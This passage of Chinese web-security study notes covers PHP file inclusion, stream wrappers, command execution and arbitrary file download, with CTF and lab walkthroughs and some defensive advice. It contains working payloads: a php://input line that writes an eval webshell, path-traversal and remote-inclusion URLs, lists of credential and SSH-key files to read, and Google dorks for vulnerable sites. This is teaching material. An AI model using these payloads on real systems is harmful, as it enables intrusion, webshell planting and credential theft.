+本地文件包含和远程文件包含漏洞，自己的服务器允许别人的php代码，实现远程文件包含</p>
+<pre><code>index.php
+&lt;?php
+$file = $_GET['file'];
+if(isset($file)){
+	include(&quot;$file&quot;);
+	//   require();
+	//   require_once();
+	//   include_once();
+}else{
+	echo &quot;file fail&quot;;
+}
+同文件目录下存在其他文件会读取，目录下存在index.php，默认访问index.php，    127.0.0.1/include/?file=dudu.php
+../../etc/httpd.conf  本地包含漏洞可以读取其他文件           172.0.0.1/uploads/include.php?file=图片马的地址
+有文件包含，直接上传，或者日志进行上传。蚁剑连马时候，连得是目标马的地址
+</code></pre>
+<p>**PHP中造成文件包含的四个函数 **<br>
+<strong>1、include(),require()</strong></p>
+<p>当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>
+当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。</p>
+<p><strong>2.include_once()和include()功能相同，区别在当重复调用同一文件时。程序只调用一次</strong></p>
+<p>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>当上述的四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型，如果被包含的是txt文件，图片文件，远程URL，也都将作为PHP代码执行</p>
+<figure data-type="image" tabindex="79"><img src="https://jinqipiaopiao.github.io//post-images/1634364181179.png" alt="" loading="lazy"></figure>
+<p><strong>本地文件包含，远程文件包含的区别</strong></p>
+<p><strong>1、本地文件包含LFI（local File Include）</strong><br>
+<strong>2.远程文件包含RFI（Remote File Include）需要ini中allow_url_include = on,allow_url_fopen = on</strong></p>
+<figure data-type="image" tabindex="80"><img src="https://jinqipiaopiao.github.io//post-images/1634364184648.png" alt="" loading="lazy"></figure>
+<p><strong>PHP伪协议</strong></p>
+<pre><code>事实就是支持的协议和封装的协议12种
+file:// - 访问本地文件系统
+http:// - 访问http网站
+ftp:// - 访问FTP（s）URLS
+php:// - 访问各个输入输出流
+zlib:// - 压缩流
+data：// - 数据（RFC 2397）
+glob：// -查找匹配的文件路径模型
+ssh2：// - Secure Shell 2
+rar:// - RAR
+ogg:// - 音频流
+expect:// - 处理交互式的流
+        
+目标文件  robots.txt	 路径为127.0.0.1/www/robots.txt  	 &lt;?php phpinfo();?&gt;
+robots.zip	127.0.0.1/www/robots.zip	robots.txt
+1.php	127.0.0.1/www/1.php	&lt;?php echo('Hello world')?&gt;
+flag.txt	D:/flag.txt	flag{123test}
+</code></pre>
+<p><strong>常用协议：</strong><br>
+<strong>1.目录遍历获取flag：</strong></p>
+<figure data-type="image" tabindex="81"><img src="https://jinqipiaopiao.github.io//post-images/1634364189695.png" alt="" loading="lazy"></figure>
+<p><strong>2.php://input                              php://filter</strong></p>
+<p><strong>(1) php://input用于执行php代码</strong></p>
+<figure data-type="image" tabindex="82"><img src="https://jinqipiaopiao.github.io//post-images/1634364193742.png" alt="" loading="lazy"></figure>
+<p><strong>也可以写入shell获取服务器权限</strong></p>
+<pre><code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[CMD])?&gt;');?&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634364197993.png" alt="" loading="lazy"><br>
+<strong>（2）php://filter 用于读取源码</strong></p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=1.php
+</code></pre>
+<figure data-type="image" tabindex="83"><img src="https://jinqipiaopiao.github.io//post-images/1634364202433.png" alt="" loading="lazy"></figure>
+<p>**    3.file://**</p>
+<p>用于读取本地系统文件，在CTF中读取本地文件</p>
+<figure data-type="image" tabindex="84"><img src="https://jinqipiaopiao.github.io//post-images/1634364206764.png" alt="" loading="lazy"></figure>
+<p>**4.data:// **</p>
+<pre><code>可以写入后门，获取权限执行任意命令
+</code></pre>
+<figure data-type="image" tabindex="85"><img src="https://jinqipiaopiao.github.io//post-images/1634364211365.png" alt="" loading="lazy"></figure>
+<p><strong>5.zip://</strong></p>
+<pre><code>zip://[压缩文件的绝对路径]#[压缩文件的子文件名]
+</code></pre>
+<figure data-type="image" tabindex="86"><img src="https://jinqipiaopiao.github.io//post-images/1634364215617.png" alt="" loading="lazy"></figure>
+<p><strong>6.phar协议</strong></p>
+<p>的作用是归档，将多个文件分组为一个文件。可以处理tar和zip文件</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634364220770.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634364225174.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634364230531.png" alt="" loading="lazy"></p>
+<h1 id="web漏洞-文件操作之文件包含漏洞全解">WEB漏洞-文件操作之文件包含漏洞全解</h1>
+<figure data-type="image" tabindex="87"><img src="https://jinqipiaopiao.github.io//post-images/1634364635259.png" alt="" loading="lazy"></figure>
+<p>#文件包含漏洞<br>
+原理，检测，类型，利用，修复等</p>
+<p>#文件包含各个脚本代码<br>
+ASP，PHP，JSP，ASPX等</p>
+<pre><code>&lt;!--#include file=&quot;1.asp&quot; --&gt;
+&lt;!--#include file=&quot;top.aspx&quot; --&gt;
+&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;
+&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
+&lt;%@ include file=&quot;head.jsp&quot;%&gt;
+&lt;?php Include('test.php')?&gt;
+</code></pre>
+<p>#本地包含-无限制，有限制</p>
+<pre><code>http://127.0.0.1:8080/include.php?filename=1.txt
+http://127.0.0.1:8000/include.php?filename=../../../www.txt
+%00截断：条件：magic_quotes_gpc=Off php版本&lt;5.3.4
+filename=../../../www.txt%00
+推荐方法：长度阶段：条件：windows，点号需要长于256；linux长于4096 
+(例如：windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
+            linux：                 1.txt............................................................................................................................)
+</code></pre>
+<p>#远程包含-无限制，有限制 PHP Core ：allow_url_include：on on</p>
+<pre><code>http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
+http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
+http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
+http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt?
+</code></pre>
+<p>#何种协议流玩法</p>
+<pre><code>https://www.cnblogs.com/endust/p/11804767.html
+http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
+http://127.0.0.1:8080/include.php?filename=php://input POST:&lt;?php system('ver')?&gt;
+&lt;?php fputs(fopen('s.php'，'w'),'&lt;?php @eval($_POST[cmd])?&gt;';?&gt;
+http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
+http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<figure data-type="image" tabindex="88"><img src="https://jinqipiaopiao.github.io//post-images/1634364645209.png" alt="" loading="lazy"></figure>
+<h1 id="第30天rec代码及命令执行代码全解">第30天—REC代码及命令执行代码全解</h1>
+<p>​ 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634365256094.png" alt="" loading="lazy"></p>
+<p><strong>代码执行</strong><br>
+代码执行的危害<br>
+执行脚本代码 脚本能干嘛 它就能干嘛</p>
+<p><strong>案例（PHP环境）</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634365259502.png" alt="" loading="lazy"></p>
+<p>假设对方存在这样的一个代码执行漏洞 就可以用代码去攻击它</p>
+<p>通过evel去上传一个webshell，然后去控制它</p>
+<pre><code>&lt;?php
+$myfile = fopen(&quot;newfile.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
+$txt = &quot;Bill Gates\n&quot;;
+fwrite($myfile, $txt);
+$txt = &quot;Steve Jobs\n&quot;;
+fwrite($myfile, $txt);
+fclose($myfile);
+?&gt;
+</code></pre>
+<p>当evel换成system后，就能够执行系统命令，而操作命令取决于操作系统</p>
+<figure data-type="image" tabindex="89"><img src="https://jinqipiaopiao.github.io//post-images/1634365263725.png" alt="" loading="lazy"></figure>
+<p>执行系统命令（当前系统为windows）</p>
+<figure data-type="image" tabindex="90"><img src="https://jinqipiaopiao.github.io//post-images/1634365267387.png" alt="" loading="lazy"></figure>
+<p><strong>漏洞形成条件</strong></p>
+<p><strong>代码层面</strong><br>
+可控变量</p>
+<p>通过参数值改变值</p>
+<p>漏洞函数</p>
+<p>使用的那一个函数对变量进行操作，例如evel()与system() ，他们产生的漏洞一个是代码执行，一个是系统命令</p>
+<p><strong>漏洞检测</strong></p>
+<p><strong>白盒测试</strong><br>
+代码审计<br>
+<strong>黑盒测试</strong><br>
+扫描工具</p>
+<p>公开漏洞</p>
+<p>手工看参数值及功能点</p>
+<p>​ 判断他的数据与功能是否相同</p>
+<p><strong>案例（墨者靶场）</strong><br>
+<strong>墨者靶场黑盒功能点命令执行-应用功能</strong></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634365273183.png" alt="" loading="lazy"><br>
+打开之后 出现界面</p>
+<figure data-type="image" tabindex="91"><img src="https://jinqipiaopiao.github.io//post-images/1634365277706.png" alt="" loading="lazy"></figure>
+<p>当我输入127.0.0.1</p>
+<p>出现结果<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634365282717.png" alt="" loading="lazy"></p>
+<p>这个网站的功能 类似于系统的ping命令，这个地方就有可能出现命令执行漏洞</p>
+<p>当我们知道存在漏洞的可能性之后，有一下几个步骤</p>
+<p><strong>分析是什么操作系统</strong></p>
+<p>操作系统不一样，系统命令不一样，通过抓包获取操作系统类型</p>
+<p><strong>当确定操作系统之后，手工进行测试</strong></p>
+<figure data-type="image" tabindex="92"><img src="https://jinqipiaopiao.github.io//post-images/1634365288260.png" alt="" loading="lazy"></figure>
+<p><strong>我们开始进行管道服务（一条命令执行多条命令）</strong></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634365294182.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634365300125.png" alt="" loading="lazy"></p>
+<p><strong>利用burp进行抓包</strong></p>
+<figure data-type="image" tabindex="93"><img src="https://jinqipiaopiao.github.io//post-images/1634365304731.png" alt="" loading="lazy"></figure>
+<p><strong>获取到目录</strong></p>
+<figure data-type="image" tabindex="94"><img src="https://jinqipiaopiao.github.io//post-images/1634365308873.png" alt="" loading="lazy"></figure>
+<p><strong>读取key文件，获取key</strong></p>
+<figure data-type="image" tabindex="95"><img src="https://jinqipiaopiao.github.io//post-images/1634365313193.png" alt="" loading="lazy"></figure>
+<p>总结</p>
+<p>根据功能去判断它可能存在这样的漏洞</p>
+<p><strong>墨者靶场白盒代码及命令执行-代码分析</strong></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634365320200.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634365326251.png" alt="" loading="lazy"></p>
+<p><strong>查看源码</strong></p>
+<figure data-type="image" tabindex="96"><img src="https://jinqipiaopiao.github.io//post-images/1634365331264.png" alt="" loading="lazy"></figure>
+<p><strong>在网上找一个线上环境，运行一下这个环境即可</strong></p>
+<figure data-type="image" tabindex="97"><img src="https://jinqipiaopiao.github.io//post-images/1634365369776.png" alt="" loading="lazy"></figure>
+<p><strong>获取key</strong></p>
+<figure data-type="image" tabindex="98"><img src="https://jinqipiaopiao.github.io//post-images/1634365374397.png" alt="" loading="lazy"></figure>
+<p><strong>墨者靶场黑盒层RCE漏洞检测-公开漏洞</strong></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634365393666.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634365397528.png" alt="" loading="lazy"></p>
+<p><strong>Webmin</strong>是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器 访问Webmin的各种管理功能并完成相应的管理动作。</p>
+<p><strong>网站搜索webmin漏洞</strong></p>
+<figure data-type="image" tabindex="99"><img src="https://jinqipiaopiao.github.io//post-images/1634365401641.png" alt="" loading="lazy"></figure>
+<p>复现漏洞即可 https://www.cnblogs.com/whoami101/p/11465877.html</p>
+<p><strong>javaweb-Struts2框架类RCE漏洞-漏洞层面</strong><br>
+通过响应信息查看情况</p>
+<figure data-type="image" tabindex="100"><img src="https://jinqipiaopiao.github.io//post-images/1634365405618.png" alt="" loading="lazy"></figure>
+<p><strong>搜索漏洞复现即可</strong></p>
+<figure data-type="image" tabindex="101"><img src="https://jinqipiaopiao.github.io//post-images/1634365411799.png" alt="" loading="lazy"></figure>
+<p>防御<br>
+<strong>敏感函数禁用(php为例)</strong></p>
+<pre><code>system 执行外部程序并显示输出
+exec 执行一一个外部程序
+shell_exec 通过hel环境执行命令，并将完整的输出以字符串的方式返回
+passthru 执行外部命令并显示原始输出
+pcntl_exec 在当前进程空间执行指定程序
+</code></pre>
+<p>变量过滤或固定</p>
+<p>WAF产品</p>
+<p>例)</p>
+<pre><code>system 执行外部程序并显示输出
+
+exec 执行一一个外部程序
+
+shell_exec 通过hel环境执行命令，并将完整的输出以字符串的方式返回
+
+passthru 执行外部命令并显示原始输出
+
+pcntl_exec 在当前进程空间执行指定程序
+
+变量过滤或固定
+
+WAF产品
+</code></pre>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「沐叶清风z」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_45750691/article/details/119754114</p>
+<h1 id="web-漏洞-文件操作之文件下载读取">WEB 漏洞-文件操作之文件下载读取</h1>
+<p>原理：<br>
+产生：任意语言代码下载函数<br>
+文件下载（一些网站由于业务需求，往往需要提供文件查看或者文件下载功能，当若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞）</p>
+<p><strong>文件下载功能</strong>在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>
+所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。</p>
+<p><strong>漏洞危害</strong><br>
+下载服务器任意文件，如脚本代码，服务及系统配置文件等<br>
+可用得到的代码进一步代码审计，得到更多可利用漏洞</p>
+<p><strong>利用方式</strong><br>
+信息收集信息-》猜路径-》下载配置文件、代码文件-》利用服务器软件漏洞-》shell-》提权<br>
+首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径，然后根据收集到的信息，下载配置，如weblogic，ftp，ssh等，根据下载到的配置文件进行渗透<br>
+1.读取程序源代码（如密码配置文件）<br>
+2.读取程序配置文件（如数据库连接文件）<br>
+如webloginc，ssh，ftp，数据库配置文件等，当接触密码后进行登录，getshell<br>
+3。读取操作系统关键文件（如/etc/sadow,/root/.bash_history等文件）<br>
+4.读取运维配置文件（redis/rsync/ftp/ssh客户端数据等）<br>
+5.读取中间件配置文件（weblogic、tomcat，密码文件，apache的httpd.conf文件）<br>
+6.下载web日志文件（获取网站后台、上传文件等）<br>
+下载日志文案金，找到登录、上传。后台，操作，找到登录入口可以爆破，测试默认口令，弱口令，找到文件上传点则测试文件上传漏洞找到后台操作<br>
+7，结合ssrf获取内网机器文件<br>
+8.可以利用../返回到上级目录下载敏感文件</p>
+<p><strong>系统文件</strong><br>
+<strong>window</strong></p>
+<pre><code>C:\boot.ini //查看系统版本
+C:\Windows\System32\inetsrv\MetaBase. xml //IIS配置文件
+C:\Windows\repair\sam //存储系统初次安装的密码
+C:\Program Files\mysql\my.ini //Mysql配置
+C:\Program Files\mysql\data\mysql\user. MYD  //Mysql root 
+C:\Windows\php.ini //php配置信息 
+C:\Windows\my.ini //Mysql配置信息
+</code></pre>
+<p><strong>Linux</strong></p>
+<pre><code>.bash_history` # 历史中可能带着用户的密码 ( 遇到过现实案例,是输错的情况下参数的,比如没 输入 su 却以为自己输了 su)
+/etc/passwd # 用户情况 
+/etc/shadow # 直接 John the Ripper 
+/etc/hosts # 主机信息，通常配置了一些内网 域名
+/root/.bash_history //root的bash历史记录
+/root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录
+/root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件
+/var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件
+/proc/self/fd/fd[0-9]*(文件标识符) 
+/proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用 
+/proc/mounts // 挂载的文件系统列表 
+/proc/net/arp //arp表，可以获得内网其他机器的地址
+/proc/net/route //路由表信息 
+/proc/net/tcp and /proc/net/udp // 活动连接的信息
+/proc/net/fib_trie // 路由缓存
+/proc/version // 内核版本
+/proc/[PID]/cmdline // 可能包含有用的路径信息
+/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell
+/proc/[PID]/cwd // 当前进程的工作目录
+/proc/[PID]/fd/[#] // 访问file descriptors， 某写情况可以读取到进程正在使用的文件，比如 access.log /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1
+/usr/local/tomcat/conf/tomcat-users. xml # tomcat 用户配置文件 
+/root/.bashrc # 环境变量 
+/root/.bash_history # 还有root外的其他用户
+/root/.viminfo # vim 信息
+/root/.ssh/id_rsa # 拿私钥直接ssh 
+/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite 数据库 config 文件     web 日志 access.log, error.log /var/lib/php/sess_PHPSESSID # 非常规问题 session 文件 
+/proc/net/arp /proc/net/tcp /proc/net/udp /proc/net/dev
+</code></pre>
+<p><strong>常见脚本敏感文件参考</strong></p>
+<pre><code>PHP： inc/config. php获得数据库连接字符串中的口令信息
+asp： inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。
+aspx： web.config网站根目录文件，获得数据库连接信息。
+JSP： conf/ tomcat-user.xml文件，获得tomcat管理界面的口令信息
+WEB- INF /Web. xml文件,获得数据库连接字符串中的口令信息。
+</code></pre>
+<p><strong>任意文件读取</strong></p>
+<pre><code>&lt;?php
+$filename = &quot;test.txt&quot;;
+readfile($filename);
+?&gt;
+
+&lt;?php
+$filename = &quot;test.txt&quot;;
+$fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;);
+$data = fread($fp,filesize($filename));
+fclose($fp);
+echo $data;
+?&gt;
+
+&lt;?php
+$filename = &quot;test.txt&quot;;
+echo file_get_contents($filename);
+?&gt;
+</code></pre>
+<p><strong>任意文件下载</strong><br>
+直接下载：</p>
+<pre><code>&lt;a href=&quot;http://www.xx.com/a.zip&quot;&gt;Download&lt;/a&gt;
+</code></pre>
+<p><strong>用header()下载：</strong></p>
+<pre><code>&lt;?php
+$filename = &quot;uploads/201607141437284653.jpg&quot;;
+header('Content-Type: imgage/jpeg');
+header('Content-Disposition: attachment; filename='.$filename);
+header('Content-Lengh: '.filesize($filename));
+?&gt;
+</code></pre>
+<p><strong>Google search</strong></p>
+<pre><code>inurl:&quot;readfile.php?file=&quot;
+inurl:&quot;read.php?filename=&quot;
+inurl:&quot;download.php?file=&quot;
+inurl:&quot;down.php?file=&quot;
+</code></pre>
+<p>等等...</p>
+<p><strong>漏洞利用代码</strong></p>
+<pre><code>readfile.php?file=/etc/passwd
+readfile.php?file=../../../../../../../../etc/passwd
+readfile.php?file=../../../../../../../../etc/passwd%00
+
+1.文件被解析，则是文件包含漏洞
+2.显示源代码，则是文件读取漏洞
+3.提示文件下载，则是文件下载漏洞
+</code></pre>
+<p><strong>漏洞挖掘</strong><br>
+可以用Google hacking或Web漏洞扫描器<br>
+从链接上看，形如：</p>
+<pre><code>• readfile.php?file=***.txt
+• download.php?file=***.rar
+</code></pre>
+<p>从参数名看，形如：</p>
+<pre><code>• &amp;RealPath= 
+• &amp;FilePath= 
+• &amp;ﬁlepath= 
+• &amp;Path= 
+• &amp;path= 
+• &amp;inputFile= 
+• &amp;url= 
+• &amp;urls= 
+• &amp;Lang= 
+• &amp;dis= 
+• &amp;data= 
+• &amp;readﬁle= 
+• &amp;ﬁlep= 
+• &amp;src= 
+• &amp;menu= 
+• META-INF 
+• WEB-INF
+目录符号等
+../ ..\ .\ ./等
+%00 ? %23 %20 .等
+</code></pre>
+<p><strong>漏洞验证</strong></p>
+<pre><code>• index.php?f=../../../../../../etc/passwd 
+• index.php?f=../index.php 
+• index.php?f=ﬁle:///etc/passwd
+注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，
+若显示源码或提示下载则是文件查看与下载漏洞
+</code></pre>
+<p><strong>漏洞防范</strong></p>
+<p>任意文件下载漏洞的简单防护措施<br>
+1、过滤“.”符号，使用户在url中无法回溯到上级目录。<br>
+2、使用正则表达式严格判断用户输入参数的格式。<br>
+3、php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。<br>
+4、固定目录</p>
+<p><strong>案例</strong><br>
+pikuchu靶场-文件下载测试<br>
+1、判断是否为文件上传漏洞<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634368609922.png" alt="" loading="lazy"><br>
+点击任意图片，发现下载了图片，复制图片下载链接查看</p>
+<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png
+</code></pre>
+<p>查看参数名为filename，查看参数后面的值也与下载的文件名一样<br>
+初步判定为文件上传漏洞</p>
+<p><strong>2、判断下载路径</strong><br>
+filename的文件名是单纯的文件名，可判断是前面加了路径名，也可能是与网站在同一个目录下<br>
+通过URL判断文件是通过跳转到execdownload.php页面下载的，我们试试看可不可以直接下载到execdownload.php这个源码</p>
+<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634368614384.png" alt="" loading="lazy"><br>
+发现显示无法下载，说明该execdownload.php与文件不在同一个路径下，我们尝试下到上一级路径</p>
+<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php
+</code></pre>
+<figure data-type="image" tabindex="102"><img src="https://jinqipiaopiao.github.io//post-images/1634368618360.png" alt="" loading="lazy"></figure>
+<p>成功下载，打开源码发现是在download文件夹下</p>
+<figure data-type="image" tabindex="103"><img src="https://jinqipiaopiao.github.io//post-images/1634368621682.png" alt="" loading="lazy"></figure>
+<p>说明文件下载路径的文件夹与down_nba.php是同一级路径<br>
+<strong>3、尝试下载敏感文件（以下路径均通过扫描路径得到）</strong><br>
+pikachu-master/inc/config.inc.php<br>
+当前下载路径：<br>
+pikachu-master/vul/unsafedownload/download/xxx.xxx<br>
+与vul相差3个父目录，所以加3个…/<br>
+完整url：</p>
+<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=…/…/…/inc/config.inc.php
+</code></pre>
+<p>下载成功，打开发现里面存在数据库相关的配置文件</p>
+<figure data-type="image" tabindex="104"><img src="https://jinqipiaopiao.github.io//post-images/1634368626288.png" alt="" loading="lazy"></figure>
+<p><strong>小米路由器-文件读取真实测试-漏洞</strong><br>
+复现</p>
+<p><strong>RoarCTF2019-文件读取真题复现</strong><br>
+wp<br>
+首先看到一个页面,点击下help看看啥情况。</p>
+<figure data-type="image" tabindex="105"><img src="https://jinqipiaopiao.github.io//post-images/1634368638550.png" alt="" loading="lazy"></figure>
+<p>发现输出一串</p>
+<pre><code>java.io.FileNotFoundException:{help.docx}
+</code></pre>
+<p>是文件无法找到的异常信息</p>
+<figure data-type="image" tabindex="106"><img src="https://jinqipiaopiao.github.io//post-images/1634368649119.png" alt="" loading="lazy"></figure>
+<p>查询资料发现：</p>
+<pre><code>WEB-INF/web.xml泄露
+WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：
+/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+/WEB-INF/database.properties：数据库配置文件
+</code></pre>
+<p>漏洞成因：</p>
+<pre><code>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！
+</code></pre>
+<p><strong>根据上文，我们先找一下WEB-INF/web.xml,POST传值</strong></p>
+<figure data-type="image" tabindex="107"><img src="https://jinqipiaopiao.github.io//post-images/1634368655474.png" alt="" loading="lazy"></figure>
+<p>得到WEB-INF/web.xml文件，打开</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+version=&quot;4.0&quot;&gt;
+
+&lt;welcome-file-list&gt;
+&lt;welcome-file&gt;Index&lt;/welcome-file&gt;
+&lt;/welcome-file-list&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;servlet&gt;
+&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+&lt;servlet-mapping&gt;
+&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
+&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+
+&lt;/web-app&gt;
+</code></pre>
+<p>我们可以看到com.wm.FlagController，</p>
+<pre><code>&lt;servlet&gt;
+&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
+&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+</code></pre>
+<p>servlet-class里面的.代表的是路径/<br>
+然后下载FlagController.class文件试一试</p>
+<pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
+</code></pre>
+<p>打开文件发现一串base编码，进行base64解密得到flag</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1634368663365.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634368667761.png" alt="" loading="lazy"><br>
+https://www.cnblogs.com/yanze/p/10457924.html<br>
+https://www.runoob.com/servlet/servlet-tutorial.html<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1634368672510.png" alt="" loading="lazy"></p>
+<p><strong>百度杯2017二月-Zone真题复现</strong></p>
+<p>1、 尝试burp抓包发现cookie中有个login，值为0，将0改为1后在访问首页，发现可以正常登入</p>
+<figure data-type="image" tabindex="108"><img src="https://jinqipiaopiao.github.io//post-images/1634368678409.png" alt="" loading="lazy"></figure>
